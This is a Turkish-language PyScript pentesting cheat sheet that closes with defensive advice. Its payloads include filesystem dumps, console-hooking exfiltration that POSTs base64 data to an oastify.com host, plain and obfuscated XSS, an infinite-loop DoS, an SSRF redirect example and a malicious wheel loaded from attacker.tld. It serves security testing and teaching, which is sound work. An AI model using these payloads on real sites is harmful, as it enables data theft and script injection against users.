# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## PyScript Pentesting Guide

PyScript, Python'ı HTML'e entegre etmek için geliştirilmiş yeni bir framework'tür; bu nedenle HTML ile birlikte kullanılabilir. Bu cheat sheet'te PyScript'i penetration testing amaçlarınız doğrultusunda nasıl kullanacağınızı bulabilirsiniz.

### Emscripten virtual memory filesystem'dan dosya dökümü alma / dosyaları geri getirme:

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
Code:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
Sonuç:

![PyScript Pentesting Guide - Emscripten sanal bellek dosya sisteminden dosya dökümü alma / dosyaları getirme: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [Emscripten sanal bellek dosya sisteminden OOB Veri Sızdırma (konsol izleme)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
Kod:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
Sonuç:

![Emscripten sanal bellek dosya sisteminden dosyaları dump etme / alma - Emscripten sanal bellek dosya sisteminin OOB Data Exfiltration yöntemiyle alınması (konsol izleme): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Ordinary)

Kod:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
Sonuç:

![Emscripten sanal bellek dosya sisteminin OOB Data Exfiltration'ı (konsol izleme) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

Kod:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
Sonuç:

![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

Kod:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
Sonuç:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (Sonsuz döngü)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS attack (Sonsuz döngü)

Kod:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
Sonuç:

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Yeni güvenlik açıkları ve teknikler (2023-2025)

### Server-Side Request Forgery via uncontrolled redirects (CVE-2025-50182)

`urllib3 < 2.5.0`, PyScript ile birlikte gelen **Pyodide runtime** içinde çalıştırıldığında `redirect` ve `retries` parametrelerini yok sayar. Bir saldırgan hedef URL'leri etkileyebiliyorsa, geliştirici bunları açıkça devre dışı bırakmış olsa bile Python kodunu cross-domain redirect'leri takip etmeye zorlayabilir; bu da anti-SSRF mantığını etkili bir şekilde bypass eder.<sup>[[1]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```
`urllib3 2.5.0` sürümünde düzeltildi – PyScript image içindeki paketi yükseltin veya güvenli bir sürümü `packages = ["urllib3>=2.5.0"]` ile sabitleyin. Ayrıntılar için resmi CVE kaydına bakın.

### Keyfi package yükleme ve tedarik zinciri saldırıları

PyScript, `packages` listesinde keyfi URL'lere izin verdiğinden, configuration'ı değiştirebilen veya configuration'a injection yapabilen kötü amaçlı bir actor, victim'ın browser'ında **tamamen keyfi Python** çalıştırabilir:
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```
*Yalnızca pure-Python wheel'ler gereklidir – WebAssembly derleme adımına gerek yoktur.* Yapılandırmanın kullanıcı tarafından kontrol edilmediğinden emin olun ve güvenilir wheel'leri HTTPS ve SRI hash'leri ile kendi alan adınızda barındırın.

### Output sanitisation changes (2023+)

* `print()` hâlâ ham HTML enjekte eder ve bu nedenle XSS'e açıktır (yukarıdaki örnekler).
* Daha yeni `display()` yardımcısı varsayılan olarak HTML'i escape eder – ham markup `pyscript.HTML()` ile sarmalanmalıdır.
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Bu davranış 2023'te kullanıma sunulmuştur ve resmi Built-ins guide'da belgelenmiştir. Güvenilmeyen girdiler için `display()` kullanın ve doğrudan `print()` çağırmaktan kaçının.<sup>[[2]](#references)</sup>

---

## Savunma İçin En İyi Uygulamalar

* **Paketleri güncel tutun** – `urllib3 >= 2.5.0` sürümüne yükseltin ve siteyle birlikte gelen wheel'ları düzenli olarak yeniden oluşturun.
* **Paket kaynaklarını kısıtlayın** – yalnızca PyPI adlarına veya same-origin URL'lere başvurun; bunları ideal olarak Sub-resource Integrity (SRI) ile koruyun.
* **Content Security Policy'yi güçlendirin** – enjekte edilen `<script>` bloklarının çalıştırılamaması için satır içi JavaScript'i (`script-src 'self' 'sha256-…'`) devre dışı bırakın.
* **Kullanıcı tarafından sağlanan `<py-script>` / `<script type="py">` etiketlerine izin vermeyin** – HTML'yi diğer kullanıcılara geri göndermeden önce sunucuda sanitize edin.
* **Worker'ları izole edin** – worker'ların DOM'a senkron erişmesine ihtiyacınız yoksa `sync_main_only` flag'ini etkinleştirerek `SharedArrayBuffer` header gereksinimlerini önleyin.

## Kaynaklar

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [PyScript Built-ins documentation – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - The Art of Vulnerability Chaining (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)

{{#include ../../banners/hacktricks-training.md}}
